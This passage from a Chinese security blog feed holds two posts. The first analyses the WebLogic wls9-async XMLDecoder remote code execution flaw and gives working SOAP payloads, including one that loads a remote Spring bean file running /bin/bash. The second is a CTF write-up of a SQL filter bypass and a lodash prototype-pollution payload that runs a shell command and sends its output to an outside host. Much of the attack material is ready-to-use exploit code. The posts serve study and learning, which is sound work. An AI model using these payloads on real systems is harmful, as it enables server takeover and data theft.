l0ca1.0hi1213pu5qcednmhhch7a8x5obez3.burpcollaborator.net&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">              &lt;/array&gt;</span><br><span class="line">              &lt;<span class="keyword">void</span> method=<span class="string">"start"</span>/&gt;</span><br><span class="line">            &lt;/object&gt;</span><br><span class="line">          &lt;/java&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">      &lt;/soapenv:Header&gt;</span><br><span class="line">      &lt;soapenv:Body/&gt;</span><br><span class="line">    &lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="comment">//来源：https://www.03sec.com/3211.shtml</span></span><br><span class="line"><span class="comment">//&lt;java&gt;标签可以去除</span></span><br></pre></td></tr></table></figure><p>这里创建 ProcessBuilder 是通过<code>&lt;object&gt;</code>标签加上属性 class 去创建的。ProcessBuilder 的 common 参数是通过 array 标签去传递的，调用 start 方法是通过<code>&lt;void method=&quot;start&quot;&gt;</code>去调用的。<code>&lt;array&gt;</code>标签会首先通过 Array.newInstance(“java.lang.String”,3)创建 array，然后通过 void 配合 index 值即<code>&lt;void index=&quot;&quot;&gt;</code>，在每次 void 标签结束时，获取 array 标签的值，即创建的 Array，然后调用 set 方法进行添加值。在 array 标签结束后，将最终的 array 通过参数设置，设置给 object 标签对象的 argument 属性中，最后在<code>&lt;void method=&quot;start&quot;&gt;</code>的时候，进行反射调用。<br>根据分析，poc 可以进行一些小改动。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;object <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">可以替换为</span><br><span class="line">&lt;<span class="keyword">void</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;<span class="keyword">new</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">这三个都可以返回一个具体对象 而&lt;<span class="class"><span class="keyword">class</span>&gt;标签只能返回一个<span class="title">Class</span>对象</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">void</span> <span class="title">method</span></span>=<span class="string">"start"</span>/&gt;</span><br><span class="line">可以替换为</span><br><span class="line">&lt;method name=<span class="string">"start"</span>/&gt;</span><br><span class="line"></span><br><span class="line">应该是有很多变种，比如利用静态方法获取Object</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">            &lt;method name=<span class="string">"getRuntime"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.Runtime"</span>&gt;</span><br><span class="line">            &lt;method name=<span class="string">"exec"</span>&gt;</span><br><span class="line">            &lt;string&gt;ping ccc.d4ihrpfqecs5p7tzf88c21i0qrwhk6.burpcollaborator.net&lt;/string&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body /&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><h2 id="POC2-分析"><a href="#POC2-分析" class="headerlink" title="POC2 分析"></a>POC2 分析</h2><p>这个是跟据这篇<a href="http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi" target="_blank" rel="noopener">文章</a>做的笔记</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口：/_async/AsyncResponseService</span></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:wsa=<span class="string">"http://www.w3.org/2005/08/addressing"</span> xmlns:balisong=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;test&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">xxxxxx</span>&lt;<span class="title">void</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">void</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">     &lt;/soapenv:Header&gt;</span><br><span class="line">     &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;balisong:onAsyncDelivery&gt;calculator&lt;/balisong:onAsyncDelivery&gt;</span><br><span class="line">     &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="comment">//来源 http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi</span></span><br></pre></td></tr></table></figure><p>根据文章补丁截图，不允许使用 object、new、method 标签，void 的标签只允许 index 属性出现。结合上面的 poc1，是没有办法直接反射调用类方法类了。<br>因为存在 class 标签，可以返回一个 Class 对象，同时 void 还可以使用，所以是可以通过反射完成初始化类的。完成过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassElementHandler</span> <span class="keyword">extends</span> <span class="title">StringElementHandler</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getOwner().findClass(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ObjectElementHandler</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       .....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//默认为new方法，Expression在封装中，将new转变为newInstance，完成class的初始化。无参通过Class.newInstance,</span></span><br><span class="line"><span class="comment">//有参通过Constructor.newInstance。</span></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Expression</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//无参构造与有参构造</span></span><br><span class="line"><span class="keyword">if</span> (methodName.equals(<span class="string">"new"</span>)) &#123;</span><br><span class="line">      methodName = <span class="string">"newInstance"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (methodName.equals(<span class="string">"newInstance"</span>) &amp;&amp; arguments.length != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (target == Character<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">arguments</span>.<span class="title">length</span> </span>== <span class="number">1</span> &amp;&amp;</span><br><span class="line">        argClasses[<span class="number">0</span>] == String<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Character(((String)arguments[<span class="number">0</span>]).charAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        m = ConstructorFinder.findConstructor((Class)target, argClasses);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NoSuchMethodException exception) &#123;</span><br><span class="line">        m = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (m <span class="keyword">instanceof</span> Method) &#123;</span><br><span class="line">          <span class="keyword">return</span> MethodUtil.invoke((Method)m, target, arguments);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> ((Constructor)m).newInstance(arguments);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>既然还可以调用构造函数，那么就需要寻找构造函数中存在恶意操作的类。</p><h3 id="POC2-UnitOfWorkChangeSet"><a href="#POC2-UnitOfWorkChangeSet" class="headerlink" title="POC2-UnitOfWorkChangeSet"></a>POC2-UnitOfWorkChangeSet</h3><p>这个是从参考<a href="http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi" target="_blank" rel="noopener">文章</a>中选出来学习的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UnitOfWorkChangeSet</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteIn = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream objectIn = <span class="keyword">new</span> ObjectInputStream(byteIn);</span><br><span class="line">        <span class="keyword">this</span>.allChangeSets = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">        <span class="keyword">this</span>.deletedObjects = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>他的这个构造函数中，通过 bytes 完成了反序列化。所以利用 UnitOfWorkChangeSet 可以完成二次反序列化利用。后续就是利用链的问题。这里试了一下 URLDNS。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> result string</span><br><span class="line">filename := <span class="string">"/tmp/test.bin"</span></span><br><span class="line"><span class="keyword">var</span> fileContentsBytes []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> fileContentsBytes, err = ioutil.ReadFile(filename); err != nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">result = fmt.Sprintf(<span class="string">"&lt;array class=\"byte\" length=\"%d\"&gt;"</span>, len(fileContentsBytes))</span><br><span class="line"><span class="keyword">for</span> i, b := range fileContentsBytes &#123;</span><br><span class="line">sIndex := fmt.Sprintf(<span class="string">"&lt;void index=\"%d\"&gt;&lt;byte&gt;%d&lt;/byte&gt;&lt;/void&gt;"</span>, i, int8(b))</span><br><span class="line">result = result + sIndex</span><br><span class="line">&#125;</span><br><span class="line">result = result + <span class="string">"&lt;/array&gt;"</span></span><br><span class="line">fmt.Println(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 golang 的 byte 是 uint8，java 是 int8，需要进行转换。然后将得到的<code>&lt;array&gt;</code>标签内容添加到 POC2 中。</p><h3 id="POC2-FileSystemXmlApplicationContext"><a href="#POC2-FileSystemXmlApplicationContext" class="headerlink" title="POC2-FileSystemXmlApplicationContext"></a>POC2-FileSystemXmlApplicationContext</h3><p>参考来源同上。<br>为了大致搞清楚这个类的利用流程，需要了解 spring bean 的大致逻辑。在 github 上寻找了一个 spring bean 核心部分<a href="https://github.com/greyireland/tiny-spring" target="_blank" rel="noopener">简化版</a>，能让我大致搞明白基本流程。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span><br><span class="line">    xmlns:wsa=<span class="string">"http://www.w3.org/2005/08/addressing"</span> xmlns:balisong=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;wsa:Action&gt;test&lt;/wsa:Action&gt;</span><br><span class="line">        &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">            &lt;class&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;void&gt;&lt;string&gt;http://172.16.170.1:8000/test.xml&lt;/string&gt;&lt;/void&gt;</span><br><span class="line">            &lt;/class&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;balisong:onAsyncDelivery&gt;calculator&lt;/balisong:onAsyncDelivery&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test.xml</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">    xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xsi:schemaLocation=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"pb"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span> init-method=<span class="string">"start"</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;/bin/bash&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;ping l0ca1.ii4t2n0htwjpwqlo1e6s2jjuwl2cq1.burpcollaborator.net&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>这里利用 FileSystemXmlApplicationContext 的构造函数，传递了一个 http 地址。<br>通过调试知道在获取 Resource 的时候，FileSystemXmlApplication 会调用 DefaultResourceLoader.getResource</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Resource <span class="title">getResource</span><span class="params">(String location)</span> </span>&#123;</span><br><span class="line">        Assert.notNull(location, <span class="string">"Location must not be null"</span>);</span><br><span class="line">        <span class="keyword">if</span> (location.startsWith(<span class="string">"classpath:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ClassPathResource(location.substring(<span class="string">"classpath:"</span>.length()), <span class="keyword">this</span>.getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(location);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UrlResource(url);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException var3) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getResourceByPath(location);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>location 如果是一个合法 URL，则直接返回一个 URLResource，后续会调用 getInputStream 去获取内容。因为没有一个判断标准，所以这里好像是没法用于 GET 型的 SSRF 的。如果是文件相对地址的话，会返回一个 FileResource。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URLRESOURCE</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        URLConnection con = <span class="keyword">this</span>.url.openConnection();</span><br><span class="line">        con.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> con.getInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//FILERESOURCE</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FileInputStream(<span class="keyword">this</span>.file);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后面的工作就是解析 XML 文件返回 bean 对象。<br>因为 bean 提供一个 init-method 属性，他表现在 BeanDefinition 的 initMethodName 属性中，如果存在此属性，则会在导出对象时，通过反射进行调用。<br>虽然还有一个 destroyMethodName 属性，后续也可以利用来进行反射，但是需要 FileSystemXmlApplication 在执行 close 方法后才会进行反射调用，在构造函数中肯定是不会调用 close 的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章整体学习于 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&quot; target=&quot;_bla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Code-Breaking JS</title>
    <link href="http://yoursite.com/2018/11/25/Code-Breaking-JS/"/>
    <id>http://yoursite.com/2018/11/25/Code-Breaking-JS/</id>
    <published>2018-11-24T17:22:41.000Z</published>
    <updated>2020-07-07T02:09:52.549Z</updated>
    
    <content type="html"><![CDATA[<p>题目来自 “代码审计知识星球”（ p 师傅 ）<br> 学习  了  一下，做了两道关于 JS 的题</p><h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><p><code>safeKeyword</code> 过滤函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(&#x2F;(union|select|;|\-\-)&#x2F;is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对 <code>union|select|;|--</code> 进行了检测</p><p> 漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let user &#x3D; await ctx.db.get(&#96;SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; &#x3D; &#39;$&#123;username.toUpperCase()&#125;&#39; AND &quot;password&quot; &#x3D; &#39;$&#123;password.toUpperCase()&#125;&#39;&#96;)</span><br></pre></td></tr></table></figure><p>函数 <code>toUpperCase</code> 是存在一些特殊情况的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase()</span><br><span class="line">&quot;I&quot;</span><br><span class="line">&quot;ſ&quot;.toUpperCase()</span><br><span class="line">&quot;S&quot;</span><br></pre></td></tr></table></figure><p>即可绕过过滤函数。</p><h2 id="hard-thejs"><a href="#hard-thejs" class="headerlink" title="hard - thejs"></a>hard - thejs</h2><p>代码比较少，使用 <code>lodash</code> 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。猜测是 <code>merge</code> 有问题，查看版本，然后在 github 上搜索：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/15431599099637.jpg" alt="15431599099637"></p><p>发现一个有意思的。<br>增加一个 <code>safeGet</code> 函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function safeGet(object, key) &#123;</span><br><span class="line">    return key &#x3D;&#x3D; &#39;__proto__&#39;</span><br><span class="line">      ? undefined</span><br><span class="line">      : object[key];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>增加了判断原型属性的函数，没有的话可以进行原型污染。<br>开始看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res.render(&#39;index&#39;, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>想着原型污染有点不太可能，后来测试发现，<code>merge</code> 直接将注入的原型属性的值写到了最底层的 Object ,这样每创建一个对象，注入的对象都会在原型属性当中。<br>接下来寻找可以利用的点，查看 <code>template</code> 函数，发现<a href="https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089" target="_blank" rel="noopener">敏感的点</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; attempt(function() &#123;</span><br><span class="line">    return Function(importsKeys, sourceURL + &#39;return &#39; + source)</span><br><span class="line">      .apply(undefined, importsValues);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>继续找 <a href="https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1029" target="_blank" rel="noopener">可控点</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;</span><br></pre></td></tr></table></figure><p>其中 <code>option</code> 为我们在模版引擎中，渲染的值。这里读取其中的 <code>sourceURL</code> 属性的值，我们就可以通过原型污染，添加一个 <code>sourceURL</code> 属性并控制值，在拼接到 <code>Function</code> 中达到执行 JS 的目的。<br>模版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Function(&quot;&quot;,&quot;&#x2F;&#x2F;# sourceURL&#x3D;&#39;xxx&#39;\r\n[CODE]\r\n&quot;)();</span><br></pre></td></tr></table></figure><p>这里有个小 TIP ?：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/15431606816156.jpg" alt="-w716"><br>没法直接在 <code>Function</code> 中引入 <code>require</code>。查了一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var require &#x3D; global.require || global.process.mainModule.constructor._load</span><br></pre></td></tr></table></figure><p>所以原型污染 + 执行任意 JS。<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;xxx\r\nvar require &#x3D; global.require || global.process.mainModule.constructor._load;var result &#x3D; require(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag_thepr0t0js&#39;).toString();var req &#x3D; require(&#39;http&#39;).request(&#96;http:&#x2F;&#x2F;l0ca1.com&#x2F;$&#123;result&#125;&#96;);req.end();\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目来自 “代码审计知识星球”（ p 师傅 ）&lt;br&gt; 学习  了  一下，做了两道关于 JS 的题&lt;/p&gt;
&lt;h2 id=&quot;easy-nodechr&quot;&gt;&lt;a href=&quot;#easy-nodechr&quot; class=&quot;headerlink&quot; title=&quot;easy -
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
